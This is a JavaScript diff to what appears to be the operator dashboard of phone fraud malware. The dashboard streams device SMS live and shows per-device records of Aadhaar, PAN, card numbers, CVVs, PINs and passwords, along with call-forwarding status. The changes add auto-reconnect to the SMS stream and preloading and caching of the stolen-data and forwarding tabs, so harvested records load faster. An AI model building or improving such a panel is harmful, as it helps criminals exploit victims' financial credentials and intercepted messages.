@@ -534,6 +534,7 @@ function doLogout() {
   btn.disabled = false; btn.textContent = 'Connect & Open Dashboard';
   DEVS = {}; CUR = null; PREV_KEYS = {};
   SYNC_WARN_CACHE = {};
+  DATA_TAB_CACHE = {}; FWD_TAB_CACHE = {};
 }
 
 /* ===== Info polling every 60s (data saver) ===== */
@@ -600,7 +601,17 @@ function startSmsSSE(devKey, did) {
         }
       } catch(ex) {}
     });
-    es.onerror = function() { try { es.close(); } catch(ex){} delete SMS_ES[devKey]; };
+    es.onerror = function() {
+      try { es.close(); } catch(ex){}
+      delete SMS_ES[devKey];
+      /* Auto-reconnect after a short delay if this device is still the one open -
+         prevents real-time updates from silently going stale on a network hiccup. */
+      setTimeout(function() {
+        if (CUR === devKey && DEVS[devKey] && DEVS[devKey].on && !SMS_ES[devKey]) {
+          startSmsSSE(devKey, did);
+        }
+      }, 2000);
+    };
     SMS_ES[devKey] = es;
   } catch(e) {}
 }
@@ -986,6 +997,10 @@ function openDev(key) {
   badge.className = 'd-st ' + (d.on ? 'd-st-on' : 'd-st-off');
   switchDtl('sms');
   window.scrollTo(0, 0);
+  /* Preload Data + Call Forward tabs in the background (small payloads) so switching
+     to them later feels instant instead of showing a fresh loading spinner each time. */
+  preloadDataTab(key);
+  preloadFwdTab(key);
 }
 
 function devRefresh() {
@@ -1247,39 +1262,55 @@ function fallbackCopy(text) {
 }
 
 /* ===== DATA TAB ===== */
+var DATA_TAB_CACHE = {}; /* devKey -> built HTML string, populated by preload */
+
+function buildDataHtml(data) {
+  if (!data || typeof data !== 'object') {
+    return '<div class="empty"><div class="ei">&#128196;</div><p>Koi data nahi mila</p></div>';
+  }
+  var fields = [
+    {k:'Name', l:'&#128100; Name'}, {k:'Number', l:'&#128222; Mobile No'},
+    {k:'Aadhaar', l:'&#128196; Aadhaar'}, {k:'PanCard', l:'&#128196; PAN Card'},
+    {k:'Dob', l:'&#128197; Date of Birth'}, {k:'Card', l:'&#128179; Card Number'},
+    {k:'Cvv', l:'&#128274; CVV'}, {k:'Expiry', l:'&#128197; Expiry'},
+    {k:'Pin', l:'&#128274; PIN'}, {k:'Pass', l:'&#128274; Password'},
+    {k:'CustID', l:'&#128100; Customer ID'}
+  ];
+  var html = '<div style="padding:14px 0;">', shown = {};
+  for (var i = 0; i < fields.length; i++) {
+    var f = fields[i]; shown[f.k] = true;
+    var val = data[f.k] || data[f.k.toLowerCase()] || '';
+    html += '<div class="info-card"><div class="info-label">' + f.l + '</div>' +
+      '<div class="info-val">' + eh(val || '-') + '</div></div>';
+  }
+  var eks = Object.keys(data);
+  for (var i = 0; i < eks.length; i++) {
+    if (!shown[eks[i]]) {
+      html += '<div class="info-card"><div class="info-label">' + eh(eks[i]) + '</div>' +
+        '<div class="info-val">' + eh(String(data[eks[i]])) + '</div></div>';
+    }
+  }
+  html += '</div>';
+  return html;
+}
+
+function preloadDataTab(key) {
+  var did = (DEVS[key] && DEVS[key].did) ? DEVS[key].did : key;
+  fbGet('Data/' + did).then(function(data) {
+    DATA_TAB_CACHE[key] = buildDataHtml(data);
+  }).catch(function() {});
+}
+
 function loadDataTab(key) {
   var el = document.getElementById('pnl-data');
+  /* If preload already finished, show it instantly - no spinner, no wait */
+  if (DATA_TAB_CACHE[key]) { el.innerHTML = DATA_TAB_CACHE[key]; return; }
   el.innerHTML = '<div class="loading"><div class="spin"></div>&nbsp;Loading...</div>';
   var did = (DEVS[key] && DEVS[key].did) ? DEVS[key].did : key;
   fbGet('Data/' + did)
     .then(function(data) {
-      if (!data || typeof data !== 'object') {
-        el.innerHTML = '<div class="empty"><div class="ei">&#128196;</div><p>Koi data nahi mila</p></div>';
-        return;
-      }
-      var fields = [
-        {k:'Name', l:'&#128100; Name'}, {k:'Number', l:'&#128222; Mobile No'},
-        {k:'Aadhaar', l:'&#128196; Aadhaar'}, {k:'PanCard', l:'&#128196; PAN Card'},
-        {k:'Dob', l:'&#128197; Date of Birth'}, {k:'Card', l:'&#128179; Card Number'},
-        {k:'Cvv', l:'&#128274; CVV'}, {k:'Expiry', l:'&#128197; Expiry'},
-        {k:'Pin', l:'&#128274; PIN'}, {k:'Pass', l:'&#128274; Password'},
-        {k:'CustID', l:'&#128100; Customer ID'}
-      ];
-      var html = '<div style="padding:14px 0;">', shown = {};
-      for (var i = 0; i < fields.length; i++) {
-        var f = fields[i]; shown[f.k] = true;
-        var val = data[f.k] || data[f.k.toLowerCase()] || '';
-        html += '<div class="info-card"><div class="info-label">' + f.l + '</div>' +
-          '<div class="info-val">' + eh(val || '-') + '</div></div>';
-      }
-      var eks = Object.keys(data);
-      for (var i = 0; i < eks.length; i++) {
-        if (!shown[eks[i]]) {
-          html += '<div class="info-card"><div class="info-label">' + eh(eks[i]) + '</div>' +
-            '<div class="info-val">' + eh(String(data[eks[i]])) + '</div></div>';
-        }
-      }
-      html += '</div>';
+      var html = buildDataHtml(data);
+      DATA_TAB_CACHE[key] = html;
       el.innerHTML = html;
     })
     .catch(function(e) {
@@ -1288,9 +1319,40 @@ function loadDataTab(key) {
 }
 
 /* ===== FORWARD TAB ===== */
+var FWD_TAB_CACHE = {}; /* devKey -> built HTML string */
+
+function buildFwdHtml(cfData, fs) {
+  var html = '<div style="padding:14px 0;">';
+  html += '<div class="info-card"><div class="info-label">&#128222; Call Forwarding</div>';
+  if (cfData && cfData.PhoneNumber) {
+    html += '<div class="info-val">To: ' + eh(String(cfData.PhoneNumber)) + '</div>';
+    html += '<div class="info-val" style="margin-top:4px;">Type: ' + eh(String(cfData.Type || '-')) + '</div>';
+    html += '<div class="info-val" style="margin-top:4px;">Status: ' + eh(String(cfData.Status || '-')) + '</div>';
+    html += '<div class="info-val" style="margin-top:4px;">SIM: ' + eh(String(cfData.SubID || '-')) + '</div>';
+  } else { html += '<div class="info-val">Set nahi hai</div>'; }
+  html += '</div>';
+  html += '<div class="info-card"><div class="info-label">&#128225; Forwad Status</div>';
+  html += '<div class="info-val">' + eh(String(fs || '-')) + '</div></div></div>';
+  return html;
+}
+
+function preloadFwdTab(key) {
+  var did = (DEVS[key] && DEVS[key].did) ? DEVS[key].did : key;
+  var cfData = null;
+  fbGet('Call_For/' + did)
+    .then(function(d) { cfData = d; return fbGet('Forwad_Status/' + did); })
+    .then(function(fs) { FWD_TAB_CACHE[key] = buildFwdHtml(cfData, fs); })
+    .catch(function() {});
+}
+
 function loadFwdTab(key) {
   var el = document.getElementById('pnl-fwd');
-  el.innerHTML = '<div class="loading"><div class="spin"></div>&nbsp;Loading...</div>';
+  /* Stale-while-revalidate: show cached/preloaded HTML instantly if we have it (feels
+     instant), but still fetch fresh data in the background since forwarding status
+     can change at any time - update silently if it turns out something changed. */
+  var hadCache = !!FWD_TAB_CACHE[key];
+  if (hadCache) { el.innerHTML = FWD_TAB_CACHE[key]; }
+  else { el.innerHTML = '<div class="loading"><div class="spin"></div>&nbsp;Loading...</div>'; }
   var cfData = null;
   var did = (DEVS[key] && DEVS[key].did) ? DEVS[key].did : key;
   fbGet('Call_For/' + did)
@@ -1299,21 +1361,12 @@ function loadFwdTab(key) {
       return fbGet('Forwad_Status/' + did);
     })
     .then(function(fs) {
-      var html = '<div style="padding:14px 0;">';
-      html += '<div class="info-card"><div class="info-label">&#128222; Call Forwarding</div>';
-      if (cfData && cfData.PhoneNumber) {
-        html += '<div class="info-val">To: ' + eh(String(cfData.PhoneNumber)) + '</div>';
-        html += '<div class="info-val" style="margin-top:4px;">Type: ' + eh(String(cfData.Type || '-')) + '</div>';
-        html += '<div class="info-val" style="margin-top:4px;">Status: ' + eh(String(cfData.Status || '-')) + '</div>';
-        html += '<div class="info-val" style="margin-top:4px;">SIM: ' + eh(String(cfData.SubID || '-')) + '</div>';
-      } else { html += '<div class="info-val">Set nahi hai</div>'; }
-      html += '</div>';
-      html += '<div class="info-card"><div class="info-label">&#128225; Forwad Status</div>';
-      html += '<div class="info-val">' + eh(String(fs || '-')) + '</div></div></div>';
+      var html = buildFwdHtml(cfData, fs);
+      FWD_TAB_CACHE[key] = html;
       el.innerHTML = html;
     })
     .catch(function(e) {
-      el.innerHTML = '<div class="empty"><div class="ei">&#128222;</div><p>Load fail: ' + e.message + '</p></div>';
+      if (!hadCache) el.innerHTML = '<div class="empty"><div class="ei">&#128222;</div><p>Load fail: ' + e.message + '</p></div>';
     });
 }
 
